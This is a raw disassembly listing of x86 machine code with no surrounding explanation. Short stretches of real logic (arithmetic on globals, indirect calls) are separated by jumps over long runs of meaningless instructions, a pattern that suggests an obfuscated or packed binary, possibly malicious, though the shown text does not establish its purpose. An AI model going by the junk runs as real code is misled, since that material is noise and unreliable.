  40ff16:	or     DWORD PTR ds:0x42f5e4,0x42f61c
  40ff20:	xor    esi,ecx
  40ff22:	mov    eax,0x66479db3
  40ff27:	sbb    DWORD PTR ds:0x42f544,0x359c
  40ff31:	jmp    0x41000d
  40ff36:	sub    eax,0xb7ef831b
  40ff3b:	jmp    FWORD PTR [ebp-0x25]
  40ff3e:	pushf  
  40ff3f:	in     eax,0x1a
  40ff41:	lahf   
  40ff42:	loopne 0x40ff2f
  40ff44:	daa    
  40ff45:	dec    esi
  40ff46:	inc    esp
  40ff47:	lods   al,BYTE PTR ds:[esi]
  40ff48:	add    BYTE PTR [eax],al
  40ff4a:	mov    edi,0x2e000000
  40ff4f:	push   edi
  40ff50:	pop    ebx
  40ff51:	imul   esp,DWORD PTR [eax+0x1a3762a0],0xffffffcc
  40ff58:	retf   
  40ff59:	in     eax,dx
  40ff5a:	mov    cl,0x68
  40ff5c:	push   0x3b
  40ff5e:	add    dl,BYTE PTR [edx]
  40ff60:	(bad)  
  40ff61:	es aas 
  40ff63:	xor    DWORD PTR [ecx],ebp
  40ff65:	xor    cl,BYTE PTR [edx+ebx*1-0x4f]
  40ff69:	daa    
  40ff6a:	cs (bad) 
  40ff6c:	cdq    
  40ff6d:	xchg   BYTE PTR [edi+0x6d2ac34d],ah
  40ff73:	les    esi,FWORD PTR [ebx-0x598f1f9]
  40ff79:	cs mov ah,0x44
  40ff7c:	mov    dl,0x5b
  40ff7e:	sqrtps xmm3,XMMWORD PTR [edi]
  40ff81:	ins    DWORD PTR es:[edi],dx
  40ff82:	cmp    eax,0x48119c22
  40ff87:	pop    ss
  40ff88:	mov    esi,0x5e9e70ac
  40ff8d:	ja     0x40ffca
  40ff8f:	hlt    
  40ff90:	xchg   edi,eax
  40ff91:	loopne 0x40ff2e
  40ff93:	or     eax,0x5e5f6264
  40ff98:	out    dx,al
  40ff99:	cwde   
  40ff9a:	push   esp
  40ff9b:	sub    al,0xf0
  40ff9d:	cmp    eax,0xeb6843f3
  40ffa2:	push   edi
  40ffa3:	mov    ah,0xcd
  40ffa5:	cdq    
  40ffa6:	dec    ebx
  40ffa7:	add    BYTE PTR [ebp*1-0x7418ac9b],bh
  40ffae:	aaa    
  40ffaf:	adc    al,0xb7
  40ffb2:	jno    0x40fff8
  40ffb4:	neg    DWORD PTR [ebx-0x2f]
  40ffb7:	dec    eax
  40ffb8:	adc    DWORD PTR [ebp-0x1c2c73eb],ecx
  40ffbe:	div    ebp
  40ffc0:	xchg   BYTE PTR [ebp-0x4e],dh
  40ffc3:	stos   BYTE PTR es:[edi],al
  40ffc4:	icebp  
  40ffc5:	dec    eax
  40ffc6:	jns    0x40ff6f
  40ffc8:	in     al,dx
  40ffc9:	addr16 jb 0x40ffec
  40ffcc:	push   ecx
  40ffcd:	adc    eax,0x8fb3d544
  40ffd2:	cmp    BYTE PTR [ebx],0x6d
  40ffd5:	call   0x7f39:0xb00a2b2a
  40ffdc:	ret    0x433c
  40ffdf:	mov    ds:0xe1ffc681,al
  40ffe4:	test   ch,ch
  40ffe6:	adc    DWORD PTR [eax],0x13
  40ffe9:	(bad)  
  40ffea:	sbb    al,0xb6
  40ffec:	jl     0x40ffce
  40ffee:	cmp    dh,BYTE PTR [ebx+0x6ccf1fab]
  40fff4:	out    0xf,eax
  40fff6:	xor    eax,0x40199913
  40fffb:	fcomp  QWORD PTR [esi-0x6fd26ed3]
  410001:	icebp  
  410002:	mov    ecx,0x553211c7
  410007:	mov    esp,0x115e02d4
  41000c:	xchg   BYTE PTR [ebx],ch
  41000e:	lock and DWORD PTR ds:0x42f674,0x42f59c
  410019:	sub    edx,eax
  41001b:	sbb    DWORD PTR ds:0x42f548,0x7577
  410025:	imul   edx,esi
  410028:	mov    esi,DWORD PTR [ebp-0x4]
  41002b:	mov    DWORD PTR ds:0x42f640,0x3915
  410035:	cmp    esi,edx
  410037:	mov    DWORD PTR ds:0x42f558,0x1945
  410041:	je     0x4109e4
  410047:	mov    DWORD PTR [ebp-0x18],0x4aebda42
  41004e:	xor    esi,0x3634
  410054:	mov    edx,DWORD PTR [ebp-0x18]
  410057:	xor    DWORD PTR ds:0x42f5c8,0x3bba
  410061:	jmp    0x41013d
  410066:	loopne 0x410049
  410068:	lahf   
  410069:	xchg   edx,eax
  41006a:	lahf   
  41006b:	(bad)  
  41006c:	in     eax,dx
  41006d:	repz scas al,BYTE PTR es:[edi]
  41006f:	lock aas 
  410071:	int    0x1f
  410073:	xchg   esi,eax
  410074:	mov    ah,BYTE PTR [edi+0x3]
  410077:	lods   eax,DWORD PTR ds:[esi]
  410078:	add    BYTE PTR [eax],al
  41007a:	mov    edi,0xb6000000
  41007f:	cld    
  410080:	pushf  
  410081:	push   0xffffffe1
  410083:	cld    
  410084:	add    bh,bl
  410086:	sub    eax,0xf547ca34
  41008b:	dec    ecx
  41008c:	pop    ebp
  41008d:	in     al,0xd7
  41008f:	or     BYTE PTR ss:0x565a26d5,cl
  410096:	pop    esp
  410097:	les    ebx,FWORD PTR ds:0xe7516260
  41009d:	mov    BYTE PTR [esi-0x1550df14],cl
  4100a3:	ret    0x2ec9
  4100a6:	adc    ebx,DWORD PTR [esp+eiz*8]
  4100a9:	outs   dx,BYTE PTR cs:[esi]
  4100ab:	or     edx,DWORD PTR ds:0xf4b4d4ea
  4100b1:	pop    eax
  4100b2:	mov    WORD PTR [ecx-0x6b],gs
  4100b5:	mov    eax,ds:0xf637bcfb
  4100ba:	xor    ah,BYTE PTR [ebp+0x34]
  4100bd:	pop    ebx
  4100be:	retf   
  4100bf:	pop    es
  4100c0:	cmp    eax,0x9f2e398
  4100c5:	(bad)  
  4100c6:	dec    esi
  4100c7:	(bad)  
  4100c8:	mov    esi,0xec68c9cf
  4100cd:	lds    ecx,FWORD PTR [ebp+0xc]
  4100d0:	test   eax,0xba339ae5
  4100d5:	fld    DWORD PTR [edi-0x3d]
  4100d8:	cmp    ecx,0x7b5a0452
  4100de:	lds    ebp,FWORD PTR [ebx]
  4100e0:	mov    eax,ds:0x7baefbca
  4100e5:	call   0x9c97:0x7e21c7d5
  4100ec:	inc    ebp
  4100ed:	pop    ds
  4100ee:	and    dh,BYTE PTR [esi]
  4100f0:	inc    esi
  4100f1:	scas   al,BYTE PTR es:[edi]
  4100f2:	bound  esp,QWORD PTR ds:0x99660ee6
  4100f8:	and    al,0x42
  4100fa:	repnz xchg ebx,eax
  4100fc:	call   0x2b112168
  410101:	nop
  410102:	and    DWORD PTR [ebx],0x918304d0
  410108:	in     al,dx
  410109:	scas   al,BYTE PTR es:[edi]
  41010a:	push   ebx
  41010b:	pushf  
  41010c:	std    
  41010d:	dec    esp
  41010e:	dec    esp
  41010f:	sbb    eax,0x89c54e9
  410114:	or     BYTE PTR [eax-0x6a15d620],ah
  41011a:	add    esi,DWORD PTR [edx-0x3b]
  41011d:	test   al,0x42
  41011f:	sub    eax,0xf20a36c0
  410124:	push   0xb19164f7
  410129:	adc    ebx,edx
  41012b:	int    0xbe
  41012d:	enter  0xc00,0xa
  410131:	mov    al,0xa2
  410133:	jg     0x410148
  410135:	outs   dx,DWORD PTR ds:[esi]
  410136:	fild   WORD PTR [edx]
  410138:	jae    0x410171
  41013a:	stos   WORD PTR es:[edi],ax
  41013c:	xchg   ebp,eax
  41013d:	mov    esi,DWORD PTR [ebp-0x18]
  410140:	sub    esi,0x7511
  410146:	sub    edx,0x3cf87511
  41014c:	cmp    DWORD PTR ds:0x42f5c8,0x0
  410153:	jge    0x41018a
  410159:	sub    DWORD PTR ds:0x42f540,0x724b
  410163:	jmp    0x41018a
  410168:	push   DWORD PTR [ebp-0x28]
  41016b:	push   0x42f548
  410170:	push   DWORD PTR [ebp-0x20]
  410173:	push   0x42f57c
  410178:	push   DWORD PTR [ebp-0x28]
  41017b:	push   DWORD PTR [ebp-0x20]
  41017e:	push   DWORD PTR [ebp-0x1c]
  410181:	push   DWORD PTR [ebp-0x1c]
  410184:	call   DWORD PTR ds:0x4387ec
  41018a:	shl    esi,0x10
  41018d:	xor    edx,0x78e20000
  410193:	jmp    0x41026f
  410198:	aas    
  410199:	sbb    esi,edi
  41019b:	das    
  41019c:	imul   edi
  41019e:	call   FWORD PTR [ebx]
  4101a0:	xchg   DWORD PTR [edx],ecx
  4101a2:	neg    DWORD PTR [edi-0x30]
  4101a5:	ins    BYTE PTR es:[edi],dx
  4101a6:	jmp    0xbf00:0xadc23f
  4101ad:	add    BYTE PTR [eax],al
  4101af:	add    BYTE PTR [ecx],ch
  4101b1:	push   ebp
  4101b2:	jne    0x4101b8
  4101b4:	jbe    0x4101ad
  4101b6:	rcr    dh,0x27
  4101b9:	sbb    edi,DWORD PTR [esi+edi*8+0x6d]
  4101bd:	fwait
  4101be:	js     0x410209
  4101c0:	dec    ebp
  4101c1:	sub    bh,BYTE PTR [ebp+0x2f8ce16b]
  4101c7:	(bad)  
  4101c9:	xor    eax,DWORD PTR [edx+0xd]
  4101cc:	int3   
  4101cd:	xchg   ebp,eax
  4101ce:	mov    ah,0xd6
  4101d0:	push   es
  4101d1:	xor    al,0xec
  4101d3:	jo     0x41016e
  4101d5:	mov    eax,DWORD PTR ss:[edx+eax*8]
  4101d9:	jg     0x41019a
  4101db:	xor    bl,BYTE PTR [esi-0x58]
  4101de:	aaa    
  4101df:	lds    ecx,FWORD PTR [eax-0x32]
  4101e2:	push   esi
  4101e3:	repz mov bl,0xb9
  4101e6:	xor    eax,0x1efd23c7
  4101eb:	int3   
  4101ec:	sbb    BYTE PTR [eax+0x19],al
  4101ef:	mov    ch,0x84
  4101f1:	fistp  QWORD PTR [edi+edx*8-0x42]
  4101f5:	cld    
  4101f6:	sar    BYTE PTR [eax],cl
  4101f8:	or     al,BYTE PTR [esi+0x38]
  4101fb:	sti    
  4101fc:	ja     0x410195
  4101fe:	inc    edi
  4101ff:	mov    ss,esp
  410201:	sbb    eax,ebp
  410203:	enter  0x5072,0x78
  410207:	push   ebp
  410208:	(bad)  
  41020a:	dec    ebp
  41020b:	int3   
  41020c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41020d:	aad    0x87
  41020f:	pop    edx
  410210:	mov    eax,0x92e46fd2
  410215:	sti    
  410216:	stos   DWORD PTR es:[edi],eax
  410217:	sub    BYTE PTR [eax+0xf],0x69
  41021b:	dec    esi
  41021c:	stos   DWORD PTR es:[edi],eax
  41021d:	retf   
  41021e:	mov    esi,0x735e9738
  410223:	sub    eax,0x2175b0d5
  410228:	inc    ebx
  410229:	xchg   BYTE PTR [edx],bh
  41022b:	mov    bh,0xa5
  41022d:	test   ecx,edi
  41022f:	(bad)  
  410230:	out    0xfd,al
  410232:	sti    
  410233:	mov    dh,0x25
  410235:	fisttp QWORD PTR [ebx]
  410237:	jl     0x410236
  410239:	stc    
  41023a:	dec    eax
  41023b:	push   0x690f40b
  410240:	or     al,0x13
  410242:	mov    edi,0xb6eefedc
  410247:	xor    BYTE PTR [eax],al
  410249:	iret   
  41024a:	gs push esi
  41024c:	adc    DWORD PTR [eax+0x32],eax
  41024f:	inc    ebx
  410250:	pop    ds
  410251:	mov    eax,ds:0x5f295543
  410256:	jbe    0x4102a7
  410258:	inc    ebx
  410259:	sar    bl,1
  41025b:	aam    0x87
  41025d:	adc    edi,edx
  41025f:	retf   
  410260:	mov    eax,0x885ac251
  410265:	dec    ebp
  410266:	cmp    DWORD PTR [ecx],esp
  410268:	mov    eax,ds:0x20b33f6e
  41026d:	xchg   DWORD PTR [ebp-0x3f],ebx
  410270:	jmp    0xc900:0xf68110
  410277:	pop    ecx
  410278:	or     esi,edx
  41027a:	lea    edx,[esi*8+0x183c57f0]
  410281:	sbb    esi,DWORD PTR ds:0x42f624
  410287:	mov    esi,DWORD PTR [ebp-0x4]
  41028a:	cmp    DWORD PTR ds:0x42f57c,0x0
  410291:	jbe    0x4102be
  410297:	jmp    0x4102be
  41029c:	push   0x5e80
  4102a1:	push   0x42f574
  4102a6:	push   0x42a621
  4102ab:	push   DWORD PTR [ebp-0xc]
  4102ae:	push   0x39a0
  4102b3:	push   0x1924
  4102b8:	call   DWORD PTR ds:0x4387f0
  4102be:	mov    edx,DWORD PTR [esi+edx*1]
  4102c1:	jmp    0x41039d
  4102c6:	adc    al,0x2e
  4102c8:	(bad)  
  4102ca:	sti    
  4102cb:	call   DWORD PTR [esi]
  4102cd:	out    dx,eax
  4102ce:	out    dx,eax
  4102cf:	adc    ah,dl
  4102d1:	in     al,0xe7
  4102d3:	sar    DWORD PTR ss:[edi],1
  4102d6:	sub    DWORD PTR [esi+0xbf0000],0x21450000
  4102e0:	sbb    al,0xaf
  4102e2:	daa    
  4102e3:	xor    dl,dl
  4102e5:	xor    ch,BYTE PTR ss:[esi]
  4102e8:	icebp  
  4102e9:	jmp    0xa31736f7
  4102ee:	cmp    DWORD PTR [ebx-0xe],ecx
  4102f1:	(bad)  
  4102f3:	jle    0x4102de
  4102f5:	pop    ebp
  4102f6:	gs add al,0xfb
  4102f9:	inc    esi
  4102fa:	ds pop edi
  4102fc:	xor    eax,0x2f23a328
  410301:	mov    eax,DWORD PTR [eax-0x52]
  410304:	push   edi
  410305:	mov    edx,0xb64e9c41
  41030a:	jne    0x410312
  41030c:	inc    esp
  41030d:	xor    bl,bh
  41030f:	pop    esi
  410310:	jmp    0x63fe4626
  410315:	popa   
  410316:	dec    ebx
  410317:	jg     0x410320
  410319:	ret    
  41031a:	ins    BYTE PTR es:[edi],dx
  41031b:	loopne 0x4102c2
  41031d:	push   edi
  41031e:	push   edx
  41031f:	xor    DWORD PTR [ebp+0x2ab1cd77],ebx
  410325:	cmp    eax,0x362d7922
  41032a:	jbe    0x4103a5
  41032c:	in     al,0x72
  41032e:	dec    eax
  41032f:	pop    edx
  410330:	inc    ebx
  410331:	cdq    
  410332:	dec    ebx
  410333:	enter  0x75b0,0x80
  410337:	mov    bl,0x85
  410339:	sub    al,0xa8
  41033b:	pop    es
  41033c:	scas   eax,DWORD PTR es:[edi]
  41033d:	in     al,dx
  41033e:	inc    edi
  41033f:	push   edx
  410340:	cmc    
  410341:	jge    0x4102fa
  410343:	fdiv   DWORD PTR [edx+0x51]
  410346:	or     DWORD PTR [edx+ebp*8],esp
  410349:	es (bad) 
  41034b:	ficom  DWORD PTR [ebx]
  41034d:	fucomip st,st(2)
  41034f:	mov    edx,0x1115c540
  410354:	inc    esp
  410355:	adc    BYTE PTR [esi-0x74],dl
  410358:	mov    eax,0xf2698c8d
  41035d:	xchg   edi,eax
  41035e:	cwde   
  41035f:	adc    esi,DWORD PTR ds:0x1e47a5af
  410365:	out    0x91,ax
  410368:	xchg   ebx,eax
  410369:	jns    0x4103bf
  41036b:	sub    eax,0xc3bb86b5
  410370:	repz or BYTE PTR [esi+0x6f],0x16
  410375:	push   0xffffff91
  410377:	retf   0xbcab
  41037a:	outs   dx,BYTE PTR ds:[esi]
  41037b:	push   cs
  41037c:	push   ebp
  41037d:	sub    al,0x30
  41037f:	fcmovnbe st,st(1)
  410381:	sub    edi,DWORD PTR [ebp-0x44]
  410384:	pop    ss
  410385:	and    eax,0xa9bb7798
  41038a:	lock push 0x76692ca7
  410390:	loopne 0x4103eb
  410392:	arpl   WORD PTR [ebx+0x6ceec075],di
  410398:	cld    
  410399:	or     al,0xc3
  41039b:	pop    ebx
  41039c:	mov    DWORD PTR ds:[ebp-0x4],edx
  4103a0:	mov    edx,DWORD PTR [ebp-0x38]
  4103a3:	jmp    0x41047f
  4103a8:	ds jge 0x410385
  4103ab:	neg    bl
  4103ad:	idiv   DWORD PTR [esi]
  4103af:	std    
  4103b0:	push   ebx
  4103b1:	popa   
  4103b2:	nop
  4103b3:	pop    edi
  4103b4:	stc    
  4103b5:	and    dh,BYTE PTR [eax+0xaf40e4]
  4103bb:	add    BYTE PTR [edi+0x5b000000],bh
  4103c1:	rcl    BYTE PTR [edx+0x21b59e11],0x70
  4103c8:	inc    ebp
  4103c9:	int    0xab
  4103cb:	in     al,0xab
  4103cd:	out    0x40,al
  4103cf:	mov    bh,0xc8
  4103d1:	xor    ecx,ebx
  4103d3:	jb     0x410363
  4103d5:	popa   
  4103d6:	sbb    BYTE PTR [esi],bh
  4103d8:	ds sub al,0x6e
  4103db:	sahf   
  4103dc:	nop
  4103dd:	lahf   
  4103de:	sti    
  4103df:	(bad)  
  4103e0:	pop    eax
  4103e1:	dec    ecx
  4103e2:	loope  0x4103ec
  4103e4:	cmp    dh,al
  4103e6:	and    DWORD PTR [edi-0x71cc68f9],ebx
  4103ec:	daa    
  4103ed:	mov    al,ch
  4103ef:	jmp    0x410408
  4103f1:	dec    edi
  4103f2:	push   esp
  4103f3:	inc    edi
  4103f4:	fsub   st(2),st
  4103f6:	sub    BYTE PTR [ebp+eax*1+0x73],dh
  4103fa:	xor    dl,ah
  4103fc:	dec    ebx
  4103fd:	stos   DWORD PTR es:[edi],eax
  4103fe:	inc    BYTE PTR [edx]
  410400:	add    DWORD PTR [ebx],0xbe4b377d
  410406:	test   al,0x72
  410408:	mov    ah,0xaa
  41040a:	repnz sub eax,ebx
  41040d:	mov    dl,0x29
  41040f:	out    0xc,al
  410411:	pushf  
  410412:	clc    
  410413:	mov    ebx,0x27ba2d8
  410418:	lods   eax,DWORD PTR ds:[esi]
  410419:	lock loop 0x410495
  41041c:	push   edx
  41041d:	cmp    DWORD PTR [esi],eax
  41041f:	or     edx,ecx
  410421:	and    DWORD PTR [edx-0x6d],0xffffff97
  410425:	sub    eax,0x359677a
  41042a:	es jo  0x4103e4
  41042d:	nop
  41042e:	aam    0xb0
  410430:	rcl    BYTE PTR [ecx+0xe],cl
  410433:	inc    ebp
  410434:	xchg   esp,eax
  410435:	fdiv   DWORD PTR [edx]
  410437:	jns    0x41045d
  410439:	test   DWORD PTR [eax-0x3b],edi
  41043c:	sub    DWORD PTR [edi-0x63e1a080],0x82f80942
  410446:	stos   BYTE PTR es:[edi],al
  410447:	jne    0x410479
  410449:	pop    eax
  41044a:	sti    
  41044b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41044c:	lods   eax,DWORD PTR ds:[esi]
  41044d:	popf   
  41044e:	adc    al,0x5c
  410450:	adc    eax,0x1484f9a5
  410455:	rcr    DWORD PTR [edi+edi*1-0x12],1
  410459:	sub    eax,0x76a1ceb
  41045e:	lea    edx,[esi-0x6c62698b]
  410464:	push   0x1c
  410466:	cmp    DWORD PTR [ecx-0x30],ecx
  410469:	xchg   ebp,eax
  41046a:	mov    al,0x3e
  41046c:	clc    
  41046d:	or     ecx,DWORD PTR [esi-0x3c]
  410470:	mov    al,ds:0x60c26344
  410475:	scas   al,BYTE PTR es:[edi]
  410476:	fdivr  DWORD PTR [eax-0x3cc5b570]
  41047c:	pop    esi
  41047d:	sub    ecx,DWORD PTR fs:[ebx+0x758bcc75]
  410484:	ror    BYTE PTR [ebx-0x2ecc2b83],1
  41048a:	jmp    0x410566
  41048f:	add    eax,0xfedba873
  410494:	(bad)  [edi-0x1]
  410497:	scas   al,BYTE PTR es:[edi]
  410498:	in     eax,dx
  410499:	leave  
  41049a:	les    eax,FWORD PTR [esp]
  41049d:	rcr    BYTE PTR [edi-0x1],0xaf
  4104a1:	add    BYTE PTR [eax],al
  4104a3:	mov    edi,0xff000000
  4104a8:	shr    DWORD PTR [ebp+0x7a9aa035],0x35
  4104af:	sbb    DWORD PTR [ebx+0x781ae379],ebp
  4104b5:	daa    
  4104b6:	mov    eax,0xfe799050
  4104bb:	(bad)  
  4104bc:	call   FWORD PTR [ecx-0xd]
  4104bf:	scas   al,BYTE PTR es:[edi]
  4104c0:	push   es
  4104c1:	fsubr  DWORD PTR [ebx]
  4104c3:	lock daa 
  4104c5:	mov    cl,0x95
  4104c7:	sub    eax,0xef5e9d69
  4104cc:	xchg   edi,eax
  4104cd:	les    edi,FWORD PTR [edi]
  4104cf:	sti    
  4104d0:	sbb    BYTE PTR [esi-0xa],dh
  4104d3:	inc    ebp
  4104d4:	jae    0x4104b9
  4104d6:	jo     0x410462
  4104d8:	jae    0x41051f
  4104da:	sub    bl,BYTE PTR [eax]
  4104dc:	call   0xb25dd696
  4104e1:	cdq    
  4104e2:	repz push eax
  4104e4:	sbb    al,0x93
  4104e6:	ret    
  4104e7:	test   bl,0x5c
  4104ea:	add    dh,al
  4104ec:	fsub   QWORD PTR [ebx]
  4104ee:	sti    
  4104ef:	cdq    
  4104f0:	cwde   
  4104f1:	lods   eax,DWORD PTR fs:[esi]
  4104f3:	imul   ecx,DWORD PTR [eax+0x788e6acd],0x23973446
  4104fd:	shl    ebp,0x8
  410500:	cld    
  410501:	dec    eax
  410502:	rol    BYTE PTR [edi+0x0],1
  410505:	test   al,0x84
  410507:	repz aam 0x4
  41050a:	mov    al,ds:0x68fe61e1
  41050f:	fstp   DWORD PTR [edi-0x2d7db9cb]
  410515:	jne    0x4104fa
  410517:	inc    esi
  410518:	dec    ecx
  410519:	adc    al,0x43
  41051b:	loope  0x4104e7
  41051d:	pop    edx
  41051e:	jno    0x410594
  410520:	je     0x41052e
  410522:	out    dx,al
  410523:	data16 stc 
  410525:	lock (bad) 
  410527:	aas    
  410528:	mov    esp,0x3e7ce655
  41052d:	xchg   esp,eax
  41052e:	jmp    0x410549
  410530:	pushf  
  410531:	or     al,0xe0
  410533:	nop
  410534:	push   edx
  410535:	jg     0x4104fa
  410537:	xchg   ebp,eax
  410538:	loop   0x41056b
  41053a:	push   0x56ef595
  41053f:	and    DWORD PTR [edx+0x7a],ebx
  410542:	pop    edi
  410543:	addr16 mov ds:0xb3d0,eax
  410547:	fidiv  DWORD PTR ds:0x366007f8
  41054d:	cmc    
  41054e:	cs push es
  410550:	dec    edi
  410551:	push   ebx
  410552:	mov    al,0xe9
  410554:	jb     0x41053d
  410556:	jecxz  0x4105d6
  410558:	jmp    0x4105ae
  41055a:	sbb    ecx,DWORD PTR [eax]
  41055c:	lahf   
  41055d:	mov    cl,dl
  41055f:	cmp    DWORD PTR [edx+0x74],0x898be559
  410566:	xor    esi,ecx
  410568:	sub    esi,eax
  41056a:	sub    edx,eax
  41056c:	imul   edx,esi
  41056f:	jmp    0x41064b
  410574:	not    BYTE PTR [ecx+0x4d]
  410577:	sahf   
  410578:	out    dx,eax
  410579:	sahf   
  41057a:	idiv   DWORD PTR [ecx-0x19]
  41057d:	inc    ebp
  41057e:	adc    DWORD PTR [ebp+0x6a],ebp
  410581:	addr16 int 0x95
  410584:	mov    esi,0xbf0000b0
  410589:	add    BYTE PTR [eax],al
  41058b:	add    BYTE PTR [edx-0x1e],dl
  41058e:	int    0x5
  410590:	sbb    BYTE PTR [ebp+0xa],bl
  410593:	inc    eax
  410594:	es and al,0xda
  410597:	inc    ecx
  410598:	jge    0x410582
  41059a:	mov    cl,0xc1
  41059c:	add    eax,0x9e8ce7f9
  4105a1:	shl    BYTE PTR [esi],cl
  4105a3:	enter  0x2e5,0x8f
  4105a7:	in     al,dx
  4105a8:	jle    0x410621
  4105aa:	aas    
  4105ab:	jg     0x410576
  4105ad:	into   
  4105ae:	and    eax,DWORD PTR ds:0xe41da485
  4105b4:	or     DWORD PTR [ecx+0x4fdc7a45],ebp
  4105ba:	and    ch,BYTE PTR [ecx+0x2c]
  4105bd:	sub    edi,ecx
  4105bf:	inc    edi
  4105c0:	xchg   DWORD PTR [ecx+0x456f0ec3],esp
  4105c6:	es jecxz 0x410642
  4105c9:	lahf   
  4105ca:	xor    DWORD PTR [edi],0x6
  4105cd:	or     eax,0x447e6126
  4105d2:	jae    0x410638
  4105d4:	mov    ah,0xc2
  4105d6:	std    
  4105d7:	mov    eax,ds:0x8843beac
  4105dc:	xchg   BYTE PTR [edi-0xa],ah
  4105df:	adc    BYTE PTR [esi+0x769d1689],dh
  4105e5:	les    edi,FWORD PTR [edx+0x7f9b4176]
  4105eb:	retf   0x1fe2
  4105ee:	push   ds
  4105ef:	adc    al,0x51
  4105f1:	inc    ecx
  4105f2:	mov    bh,0x47
  4105f4:	sbb    BYTE PTR [eax+0x3eef393c],ah
  4105fa:	xchg   esp,eax
  4105fb:	mov    al,dl
  4105fd:	cmp    bh,BYTE PTR [ebx-0xd]
  410600:	test   eax,0x633c5e44
  410605:	ror    DWORD PTR [ecx],0x99
  410608:	adc    BYTE PTR [ebx+edi*2],bh
  41060b:	lock push eax
  41060d:	or     ch,BYTE PTR ss:[edx+0x3e58b788]
  410614:	fs xchg esi,eax
  410616:	jae    0x410677
  410618:	mov    dh,0x93
  41061a:	(bad)  
  41061b:	in     al,0x60
  41061d:	inc    eax
  41061e:	(bad)  
  41061f:	cmp    DWORD PTR [edi+0x6f],esp
  410622:	cdq    
  410623:	cmp    ebp,esp
  410625:	adc    ch,BYTE PTR [edi]
  410627:	add    eax,esp
  410629:	pop    edi
  41062a:	sub    eax,0x95001587
  41062f:	enter  0x8469,0xdf
  410633:	mov    al,0xce
  410635:	call   0xaf1:0x28f106fd
  41063c:	rol    ebp,1
  41063e:	or     al,0x24
  410640:	and    eax,0x46ec5918
  410645:	inc    DWORD PTR [edx]
  410647:	inc    esp
  410648:	retf   0x521d
  41064b:	mov    esi,DWORD PTR [ebp-0x4]
  41064e:	cmp    esi,edx
  410650:	je     0x4109e4
  410656:	jmp    0x410732
  41065b:	dec    edi
  41065c:	mov    ecx,0xfeffec6f
  410661:	iret   
  410662:	mov    ebx,0x6de43ef6
  410667:	lahf   
  410668:	stos   DWORD PTR es:[edi],eax
  410669:	inc    edi
  41066a:	fidivr WORD PTR [ebp-0x4f]
  41066d:	add    BYTE PTR [eax],al
  41066f:	mov    edi,0x77000000
  410674:	mov    bl,0xdc
  410676:	mov    cl,0x93
  410678:	ret    
  410679:	jae    0x4106cd
  41067b:	mov    eax,ds:0x7a8f5e94
  410680:	fwait
  410681:	in     eax,0xb1
  410683:	and    eax,DWORD PTR [esi-0x43]
  410686:	or     eax,0x52bd19c0
  41068b:	fild   WORD PTR [edx]
  41068d:	dec    eax
  41068e:	ror    DWORD PTR [ebp-0x6b],1
  410691:	cmp    ebx,DWORD PTR [esi-0x675a6ba6]
  410697:	cmc    
  410698:	call   0x9d35:0xe38e6044
  41069f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4106a0:	ins    DWORD PTR es:[edi],dx
  4106a1:	or     BYTE PTR [ecx-0x5c],ch
  4106a4:	pop    esp
  4106a5:	sahf   
  4106a6:	in     al,dx
  4106a7:	outs   dx,DWORD PTR ds:[esi]
  4106a8:	mov    ds:0x10fe84b8,eax
  4106ad:	pop    ebx
  4106ae:	pop    eax
  4106af:	inc    ecx
  4106b0:	jns    0x4106eb
  4106b2:	mov    al,0x2e
  4106b4:	and    bl,ch
  4106b6:	adc    eax,0x4cd5a743
  4106bb:	mov    dh,0x89
  4106bd:	enter  0x6dc8,0x5b
  4106c1:	adc    BYTE PTR [ebx-0x5b],dl
  4106c4:	add    al,dl
  4106c6:	in     al,0x3a
  4106c8:	cs enter 0x156b,0x23
  4106cd:	lea    edx,[ebp-0x58]
  4106d0:	mov    bh,0x1c
  4106d2:	test   DWORD PTR [esi+0x42],esi
  4106d5:	mov    BYTE PTR [eax+0x7],dh
  4106d8:	mov    ch,0xa6
  4106da:	or     eax,0x9fe23179
  4106df:	or     edi,0xffffffac
  4106e2:	mov    eax,0x559794e3
  4106e8:	inc    eax
  4106e9:	cmp    DWORD PTR [edx+0x58],edi
  4106ec:	clc    
  4106ed:	push   edi
  4106ee:	cmp    DWORD PTR [ecx+edi*1-0x328b6bdf],0x24
  4106f6:	dec    ebx
  4106f7:	js     0x4106aa
  4106f9:	fsubr  st,st(5)
  4106fb:	mov    WORD PTR [esi-0x1],ds
  4106fe:	pop    es
  4106ff:	hlt    
  410700:	scas   al,BYTE PTR es:[edi]
  410701:	xchg   ecx,eax
  410702:	and    DWORD PTR [edi-0x2801b620],0x65
  410709:	lahf   
  41070a:	sub    ecx,DWORD PTR [eax-0x6d]
  41070d:	adc    ah,BYTE PTR [esi+ebp*2-0x4bb0744c]
  410714:	mov    esp,0x9a36129f
  410719:	adc    al,0x5d
  41071b:	jmp    0x89b62ff6
  410720:	out    dx,al
  410721:	(bad)  
  410722:	fld    QWORD PTR [ecx-0x64]
  410725:	xchg   ebx,eax
  410726:	test   eax,0x62014afe
  41072b:	ins    BYTE PTR es:[edi],dx
  41072c:	addr16 xchg ecx,eax
  41072e:	mov    ds:0x8bf845db,eax
  410733:	push   ebp
  410734:	enter  0x758b,0xcc
  410738:	jmp    0x410814
  41073d:	inc    edi
  41073e:	int    0x29
  410740:	sbb    al,0xab
  410742:	cld    
  410743:	ja     0x410724
  410745:	stos   BYTE PTR es:[edi],al
  410746:	sti    
  410747:	dec    edi
  410748:	cmp    BYTE PTR [ebx+0x3c1cc108],ah
  41074e:	mov    dl,0x0
  410750:	add    BYTE PTR [edi-0x4e000000],bh
  410756:	push   ecx
  410757:	stos   BYTE PTR es:[edi],al
  410758:	sub    DWORD PTR [ecx-0x6b609fc3],ebx
  41075e:	jge    0x41077d
  410760:	and    eax,0x20592a65
  410765:	push   es
  410766:	mov    al,ds:0x3a963c82
  41076b:	je     0x410794
  41076d:	cmp    DWORD PTR [ecx-0x410b4505],0x9406c308
  410777:	fnsave [edi]
  410779:	mov    eax,0x404c29eb
  41077e:	or     al,0xe4
  410781:	aaa    
  410782:	and    eax,0xf76b8c4e
  410787:	test   BYTE PTR [esi-0x3b],dl
  41078a:	inc    edi
  41078b:	call   0xb8e1:0x25bf2b10
  410792:	aas    
  410793:	stos   BYTE PTR es:[edi],al
  410794:	mov    esi,0x9e0297ef
  410799:	imul   ebp,esp,0x1649bcff
  41079f:	pop    ebp
  4107a0:	ror    DWORD PTR ds:0x1dac3d6c,cl
  4107a6:	mov    ds:0x6b8a9209,eax
